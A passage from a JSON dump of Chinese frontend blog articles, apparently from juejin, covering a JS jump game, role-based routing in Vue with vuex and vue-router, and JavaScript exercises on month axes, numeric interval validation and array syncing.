class=\"hljs-comment\"\u003e// 检测是否是移动端\u003c/span\u003e\n  _handleWindowResize: \u003cspan class=\"hljs-comment\"\u003e// 窗口缩放绑定函数\u003c/span\u003e\n  _handleMousedown: \u003cspan class=\"hljs-comment\"\u003e// 鼠标按下绑定函数\u003c/span\u003e\n  _handleMouseup: \u003cspan class=\"hljs-comment\"\u003e// 鼠标松开绑定函数\u003c/span\u003e\n  _fallingRotate: \u003cspan class=\"hljs-comment\"\u003e// 会跳的那个 摔落动画\u003c/span\u003e\n  _falling: \u003cspan class=\"hljs-comment\"\u003e// 会跳的那个 摔落\u003c/span\u003e\n  _checkInCube: \u003cspan class=\"hljs-comment\"\u003e// 判断落点位置\u003c/span\u003e\n  _updateCameraPos: \u003cspan class=\"hljs-comment\"\u003e// 更新相机坐标参数\u003c/span\u003e\n  _updateCamera: \u003cspan class=\"hljs-comment\"\u003e// 更新相机\u003c/span\u003e\n  _setSize:   \u003cspan class=\"hljs-comment\"\u003e// 设置画布尺寸\u003c/span\u003e\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e调用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e game = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Game()\ngame.init()\ngame.addSuccessFn(success)\ngame.addFailedFn(failed)\n\n...\n\n\u003cspan class=\"hljs-comment\"\u003e// 游戏重新开始，执行函数\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003erestart\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009...\n}\n\u003cspan class=\"hljs-comment\"\u003e// 游戏失败执行函数\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efailed\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n\u0009...\n}\n\u003cspan class=\"hljs-comment\"\u003e// 游戏成功，更新分数\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003esuccess\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003escore\u003c/span\u003e) \u003c/span\u003e{\n\u0009...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后有什么好玩的js相关, 欢迎一起交流\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e先这样了, 欢迎star\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1515067247.6416","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac85"},"id":"5a4da656f265da431e172d94","author":{"$oid":"5a4e17dee8405d2778beac79"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bf53da9737936?w=1091\u0026h=691\u0026f=gif\u0026s=189110"],"screenShot":null}],"title":"vue vuex vue-rouert后台项目——权限路由（超详细简单版）","meta":{"likeCount":0},"tag":["Vue.js","前端","前端框架"],"comment":[],"shortContent":"此项目拿去 捋清楚 vue+vuex+vue-router 的关系是没问题的，这可以说的超级简单的版本，适合初学。可以配合相关的官方文档学习。上面的内容说的重点，其实也算是项目的全部啦","content":"\u003cp\u003e项目地址：\u003ca target=\"_blank\" href=\"https://github.com/specialGirl/vue-simple-template\"\u003evue-simple-template\u003c/a\u003e\n共三个角色：adan barbara carrie 密码全是：123456\u003c/p\u003e\n\u003cp\u003eadan 拥有 最高权限A 他可以看到 red , yellow 和 blue 页面（共三个页面）\u003c/p\u003e\n\u003cp\u003ebarbara 拥有 权限B 他可以看到 red 和 yellow 页面\u003c/p\u003e\n\u003cp\u003ecarrie 拥有 权限C 他可以看到 red 和 blue 页面\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bf53da9737936?w=1091\u0026amp;h=691\u0026amp;f=gif\u0026amp;s=189110\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e技术栈\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ewebpack         ---- 打包神器\nvue             ---- JavaScript 框架\nvuex            ---- 实现不同组件间的状态共享\nvue-router      ---- 页面路由\nbabel-polyfill  ---- 将ES6代码转为ES5代码\nnormalize.css   ---- 重置掉该重置的样式\nelement-ui      ---- UI组件库\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e项目初始化\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cd 到项目文件夹\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e weven-simple-template\n\u003cspan class=\"hljs-comment\"\u003e# 安装依赖 （本项目还安装了其他依赖详情 请见 package.json 文件）\u003c/span\u003e\nnpm install\n\u003cspan class=\"hljs-comment\"\u003e# 运行项目\u003c/span\u003e\nnpm run dev\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e项目结构\u003c/h4\u003e\n\u003cp\u003evue-cil 脚手架初始化项目后，我只修改过src文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003esrc\n├── App.vue         ---- 页面入口\n├── api             ---- api请求\n│\u0026nbsp;\u0026nbsp; └── login.js    ---- 模拟json对象数据\n├── assets          ---- 主题 字体等静态资源\n│\u0026nbsp;\u0026nbsp; └── logo.png\n├── components      ---- 组件\n│\u0026nbsp;\u0026nbsp; ├── index.vue\n│\u0026nbsp;\u0026nbsp; └── login.vue \n├── main.js         ---- 初始化组件 加载路由\n├── router          ---- 路由\n│\u0026nbsp;\u0026nbsp; └── index.js\n└── store           ---- vuex状态管理\n    ├── getters.js\n    ├── index.js\n    └── modules\n        └── login.js\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e重点：\u003c/h4\u003e\n\u003cp\u003e动态路由的关键在于router配置的\u003ca target=\"_blank\" href=\"https://router.vuejs.org/zh-cn/advanced/meta.html\"\u003emeta字段\u003c/a\u003e和vuex的暴露在外的\u003ca target=\"_blank\" href=\"https://vuex.vuejs.org/zh-cn/getters.html\"\u003egetter字段\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ----  router/index.js  ----\n// 初始化路由\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default new Router({  \n  routes: [\n    {\n      path: \u003cspan class=\"hljs-string\"\u003e'/login'\u003c/span\u003e,\n      name: \u003cspan class=\"hljs-string\"\u003e'Login'\u003c/span\u003e,\n      component: Login\n    }\n  ]  \n});\n// 动态路由 meta 定义了role\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const powerRouter =[    \n    { path: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,redirect:\u003cspan class=\"hljs-string\"\u003e'/red'\u003c/span\u003e, name: \u003cspan class=\"hljs-string\"\u003e'index'\u003c/span\u003e,component: Index,hidden:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n      children: [\n        { path: \u003cspan class=\"hljs-string\"\u003e'/red'\u003c/span\u003e, name: \u003cspan class=\"hljs-string\"\u003e'red'\u003c/span\u003e, component: red,},\n        { path: \u003cspan class=\"hljs-string\"\u003e'/yellow'\u003c/span\u003e, name: \u003cspan class=\"hljs-string\"\u003e'yellow'\u003c/span\u003e, component: yellow, meta: {role: \u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e}},\n        { path: \u003cspan class=\"hljs-string\"\u003e'/blue'\u003c/span\u003e, name: \u003cspan class=\"hljs-string\"\u003e'blue'\u003c/span\u003e, component: blue, meta: {role: \u003cspan class=\"hljs-string\"\u003e'C'\u003c/span\u003e}}\n      ]\n    }\n];\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ----  main.js  ----\nrouter.beforeEach((to, from, next) =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(store.getters.role){ //判断role 是否存在\n    \u0009\n    \u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(store.getters.newrouter.length !== 0){  \n       \u0009\u0009next() //resolve 钩子\n\u0009    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n\u0009    \u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e newrouter\n       \u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (store.getters.role == \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e) {  //判断权限\n                newrouter = powerRouter\n            } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e newchildren = powerRouter[0].children.filter(route =\u0026gt; {\n                    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(route.meta){\n                    \u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(route.meta.role == store.getters.role){\n                    \u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n                        }\n                        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n                    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n                        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n                    }\n                });\n                newrouter = powerRouter\n                newrouter[0].children = newchildren\n            }\n            router.addRoutes(newrouter) //添加动态路由\n            store.dispatch(\u003cspan class=\"hljs-string\"\u003e'Roles'\u003c/span\u003e,newrouter).then(res =\u0026gt; { \n                next({ ...to })\n            }).catch(() =\u0026gt; {       \n\n            })\n\u0009    }\u0009  \n    }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n       \u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ([\u003cspan class=\"hljs-string\"\u003e'/login'\u003c/span\u003e].indexOf(to.path) !== -1) { \n           next()\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n           next(\u003cspan class=\"hljs-string\"\u003e'/login'\u003c/span\u003e)\n        }\n\u0009}\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ----  components/index.vue  ----\n// mapGetters 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性\n\n...mapGetters([\n        \u003cspan class=\"hljs-string\"\u003e'newrouter'\u003c/span\u003e\n    ])\n    \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此项目拿去 捋清楚 vue+vuex+vue-router 的关系是没问题的，这可以说的超级简单的版本，适合初学。可以配合相关的官方文档学习。上面的内容说的重点，其实也算是项目的全部啦\u003c/p\u003e\n\u003cp\u003e项目地址：\u003ca target=\"_blank\" href=\"https://github.com/specialGirl/vue-simple-template\"\u003evue-simple-template\u003c/a\u003e\n感觉还不错的话就请给个 star 吧～ 谢谢\u003c/p\u003e\n\u003cp\u003e有什么问题欢迎提问～\u003c/p\u003e\n","buildTime":"1515067340.3725","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c011"},"id":"5a39b2dcf265da431d3cd036","author":{"$oid":"5a4b765a751bf823c002e90b"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/20/1607162f0a70617b?w=655\u0026h=72\u0026f=png\u0026s=2465","https://user-gold-cdn.xitu.io/2017/12/20/1607162f394f1dc5?w=667\u0026h=87\u0026f=png\u0026s=2548","https://user-gold-cdn.xitu.io/2017/12/20/1607163105ecfbb8?w=597\u0026h=279\u0026f=png\u0026s=12658","https://user-gold-cdn.xitu.io/2017/12/20/1607162f4a2281ac?w=408\u0026h=114\u0026f=png\u0026s=8470","https://user-gold-cdn.xitu.io/2017/12/20/1607162f3bf74694?w=800\u0026h=502\u0026f=png\u0026s=114516","https://user-gold-cdn.xitu.io/2017/12/20/1607162f0ca86c7f?w=510\u0026h=77\u0026f=png\u0026s=9224","https://user-gold-cdn.xitu.io/2017/12/20/1607162f3aaeffde?w=775\u0026h=785\u0026f=png\u0026s=16255","https://user-gold-cdn.xitu.io/2017/12/20/1607162f97c50979?w=409\u0026h=81\u0026f=png\u0026s=5204","https://user-gold-cdn.xitu.io/2017/12/20/1607162f938e6dd4?w=383\u0026h=78\u0026f=png\u0026s=2989","https://user-gold-cdn.xitu.io/2017/12/20/1607162fc1687c5d?w=555\u0026h=116\u0026f=png\u0026s=6441","https://user-gold-cdn.xitu.io/2017/12/20/16071630133dcfdc?w=416\u0026h=51\u0026f=png\u0026s=5206","https://user-gold-cdn.xitu.io/2017/12/20/16071630109a0412?w=393\u0026h=107\u0026f=png\u0026s=8192","https://user-gold-cdn.xitu.io/2017/12/20/16071630326e0fee?w=422\u0026h=186\u0026f=png\u0026s=20526","https://user-gold-cdn.xitu.io/2017/12/20/160716300ac749e8?w=538\u0026h=150\u0026f=png\u0026s=13921","https://user-gold-cdn.xitu.io/2017/12/20/1607163005707a87?w=447\u0026h=53\u0026f=png\u0026s=3099","https://user-gold-cdn.xitu.io/2017/12/20/16071630438868f9?w=424\u0026h=75\u0026f=png\u0026s=8538","https://user-gold-cdn.xitu.io/2017/12/20/160716308aa34b59?w=365\u0026h=331\u0026f=png\u0026s=9039","https://user-gold-cdn.xitu.io/2017/12/20/160716308ee554b8?w=337\u0026h=206\u0026f=png\u0026s=7360","https://user-gold-cdn.xitu.io/2017/12/20/16071630906c2869?w=151\u0026h=64\u0026f=png\u0026s=2299","https://user-gold-cdn.xitu.io/2017/12/20/16071630907cb32c?w=375\u0026h=281\u0026f=png\u0026s=14086","https://user-gold-cdn.xitu.io/2017/12/20/16071630c7ba133d?w=800\u0026h=250\u0026f=png\u0026s=103382","https://user-gold-cdn.xitu.io/2017/12/20/16071630d77c7225?w=255\u0026h=635\u0026f=png\u0026s=5351"],"screenShot":null}],"title":"JavaScript 打怪升级 —— 把业务逻辑当练习题做","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"开发项目和出没社区有一段时间了，会遇上一些比较有印象业务需求。这些业务需求，可能是自己开发项目遇上的，可能是在社区看到的业务需求，或者其他情况接触到的需求，但是这些业务需求的实现逻辑都值得一写。因为这些业务逻辑可以当做练习题一样，可以给大家练手。也希望大家从这些需求实现的逻辑里…","content":"\u003ch2\u003e1.前言\u003c/h2\u003e\u003cp\u003e开发项目和出没社区有一段时间了，会遇上一些比较有印象业务需求。这些业务需求，可能是自己开发项目遇上的，可能是在社区看到的业务需求，或者其他情况接触到的需求，但是这些业务需求的实现逻辑都值得一写。因为这些业务逻辑可以当做练习题一样，可以给大家练手。也希望大家从这些需求实现的逻辑里面可以能到javascript的相关知识，当然如果大家觉得代码需要怎样优化，或者有什么建议，更好的实现方案，觉得我哪里写错了，或者有觉得可以分享的需求，可以在评论提下！\u003c/p\u003e\u003ch2\u003e2.月份坐标轴\u003c/h2\u003e\u003cp\u003e这个需求是，看下图就懂了\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f0a70617b?w=655\u0026amp;h=72\u0026amp;f=png\u0026amp;s=2465\"\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f394f1dc5?w=667\u0026amp;h=87\u0026amp;f=png\u0026amp;s=2548\"\u003e\u003c/p\u003e\u003cp\u003e实现方式其实很简单，我在代码打上注释，大家就懂了！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar _date=[],dateData=[\u003cspan class=\"hljs-string\"\u003e\"1月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"2月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"3月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"4月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"5月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"6月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"7月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"8月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"9月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"10月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"11月\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"12月\"\u003c/span\u003e];\n//准备一个月份反转的数组\nvar dateDataRet=Object.assign([],dateData).reverse();\n//获取当前年份\nvar yearText=new Date().getFullYear();\n//获取当前月份  调试的时候，大家可以通过调整now调试  3月-now=2,12月now=11...\nvar now=new Date().getMonth();\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i=0;i\u0026lt;6;i++){\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(now-i\u0026lt;0){\n        //如果now-i\u0026lt;0，从dateDataRet里面拿数据，下标=|now-i|-1。\n        _date.push(yearText-1+\u003cspan class=\"hljs-string\"\u003e'年'\u003c/span\u003e+dateDataRet[Math.abs(now-i)-1]);\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n        //从dateData里面拿数据，下标=now-i\n        _date.push(yearText+\u003cspan class=\"hljs-string\"\u003e'年'\u003c/span\u003e+dateData[now-i]);\n    }\n\n}\n_date.reverse();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可能大家看着会懵，直接看下面的循环图就懂了\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607163105ecfbb8?w=597\u0026amp;h=279\u0026amp;f=png\u0026amp;s=12658\"\u003e\u003c/p\u003e\u003ch2\u003e3.数值区间\u003c/h2\u003e\u003cp\u003e如下图，就是几个数值区间，而且会有一个最小值和最大值\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f4a2281ac?w=408\u0026amp;h=114\u0026amp;f=png\u0026amp;s=8470\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar _min=5,_max=50;\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e checkArr(arr,min,max){\n    //排序\n    arr.sort(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n1,n2){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e n1.min-n2.min})\n    //遍历\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;arr.length;i++){\n        //区间的最小值不能大于等于区间最大值\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i].min\u0026gt;=arr[i].max){\n            console.log(\u003cspan class=\"hljs-string\"\u003e'区间的最小值不能大于等于区间最大值'\u003c/span\u003e);\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n        }\n        //区间的最小值不能小于默认最小值\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i].min\u0026lt;min){\n            console.log(\u003cspan class=\"hljs-string\"\u003e'区间的最小值不能小于默认最小值'\u003c/span\u003e);\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n        }\n                    \n        //区间的最大值不能大于默认最大值\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i].max\u0026gt;max){\n            console.log(\u003cspan class=\"hljs-string\"\u003e'区间的最大值不能大于默认最大值'\u003c/span\u003e);\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n        }\n        //元素对比，从第二个元素开始\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(i\u0026gt;0){\n            //minInclude，maxInclude，为\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e就是不包含，为\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e就是包含\n            //{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n            //等同于(10,20)\n            //{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}\n            //等同于[20,30);\n            \n            //如果前一个的最大值和当前的最小值都是包含情况，那么当前区间的最小值一定要比前一个区间的最大值大1\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i].minInclude\u0026amp;\u0026amp;arr[i-1].maxInclude\u0026amp;\u0026amp;arr[i].min-arr[i-1].max!==1){\n                console.log(\u003cspan class=\"hljs-string\"\u003e'取值范围错误-当前区间的最小值和前一个区间的最大值都是包含情况，当前区间的最小值一定要比前一个区间的最大值大1'\u003c/span\u003e);\n                   \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n                \n            }\n            //如果前一个的最大值和当前的最小值。一个是包含，一个是不包含，那么当前区间的的最小值一定要等于上一个区间的最大值\n            \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i].minInclude!==arr[i-1].maxInclude\u0026amp;\u0026amp;arr[i].min!==arr[i-1].max){\n                console.log(\u003cspan class=\"hljs-string\"\u003e'取值范围错误-当前区间的最小值和前一个区间的最大值其中一个是包含，一个是不包含情况，当前区间的最小值一定要等于前一个区间的最大值'\u003c/span\u003e);\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n            }\n            //如果前一个的最大值和当前的最小值都是不包含，肯定不满足\n            \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e((!arr[i].minInclude)\u0026amp;\u0026amp;(!arr[i-1].maxInclude)){\n                console.log(\u003cspan class=\"hljs-string\"\u003e'取值范围错误-前一个的最大值和当前的最小值都是不包含情况，不满足收尾相连'\u003c/span\u003e);\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n            }\n        }\n    }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e测试用例\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr1=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e},{min:21,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e}],\narr2=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr3=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr4=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr5=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:21,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr6=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:15,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr7=[{min:10,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr8=[{min:1,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}],\narr9=[{min:20,max:20,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}], \narr10=[{min:20,max:30,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e},{min:20,max:70,minInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,maxInclude:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}];  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行结果\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f3bf74694?w=800\u0026amp;h=502\u0026amp;f=png\u0026amp;s=114516\"\u003e\u003c/p\u003e\u003ch2\u003e4.数组对比\u003c/h2\u003e\u003cp\u003e这个基于我回答过的一个问题，现在化用，改写一下\u003c/p\u003e\u003cp\u003eJavaScript如何对比两个数组？数组B根据数组A来做出增删？ (不用jquery，原生js)\u003cbr\u003e具体问题是这样的：\u003c/p\u003e\u003cp\u003earryA\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arrayA = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e];\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003earryB\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arrayB = [{\n    key:\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\n    num1:\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e,\n    num2:\u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e,\n    num3:\u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e,\n    tot:\u003cspan class=\"hljs-string\"\u003e'6'\u003c/span\u003e\n},{\n    key:\u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\n    num1:\u003cspan class=\"hljs-string\"\u003e'11'\u003c/span\u003e,\n    num2:\u003cspan class=\"hljs-string\"\u003e'22'\u003c/span\u003e,\n    num3:\u003cspan class=\"hljs-string\"\u003e'33'\u003c/span\u003e,\n    tot:\u003cspan class=\"hljs-string\"\u003e'66'\u003c/span\u003e\n},{\n    key: \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e,\n    num1: \u003cspan class=\"hljs-string\"\u003e'111'\u003c/span\u003e,\n    num2: \u003cspan class=\"hljs-string\"\u003e'222'\u003c/span\u003e,\n    num3: \u003cspan class=\"hljs-string\"\u003e'333'\u003c/span\u003e,\n    tot:666\n}];\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e1、如果arryA中有a，arryB中没有，那么在arryB中增加一个key值为a的boj，且其他属性值可均为'0';如下： {key:'a',num1:'0',num2:'0',num3:'0',tot':0'}\u003c/p\u003e\u003cp\u003e2、如果arryA中有a，arryB中也有key值为a的obj,那么arryB则不改变，并且该obj里的其他属性和属性值均不变;\u003c/p\u003e\u003cp\u003e3、如果在arryA中删除了a，那么arryB中key值为a的obj整个删掉。\u003c/p\u003e\u003cpre class=\"hljs 